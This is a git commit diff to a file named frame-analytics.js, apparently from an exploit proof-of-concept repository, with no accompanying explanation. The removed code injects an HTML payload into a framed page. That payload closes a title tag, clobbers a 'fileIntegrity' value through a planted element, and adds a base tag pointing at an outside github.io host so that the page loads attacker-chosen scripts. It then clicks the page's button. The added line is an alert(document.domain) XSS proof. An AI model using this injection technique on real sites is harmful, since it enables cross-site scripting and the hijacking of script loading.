c793bf677b244c2cfc3dd8f5dcdf4d3f98d3c299
Sudistark <31372554+Sudistark@users.noreply.github.com>
2020-11-09 23:25:50 +0530

    Update frame-analytics.js

--- new/files/analytics/js/frame-analytics.js
+++ new/files/analytics/js/frame-analytics.js
@@ -1,7 +1,1 @@
-
-setTimeout(() =>{
-x = document.getElementById('frame').contentWindow.document
-x.getElementsByTagName('textarea')[0].innerHTML = "</title><output id=fileIntegrity>HYScnNEeZgi9v3d5AI4QkVG6pvWViDobB+fqjhTHi5o=</output><base href=//sudistark.github.io/new1/>"
-x.getElementById("btn").click();
-console.log("done click")
-},10000)
+alert(document.domain);
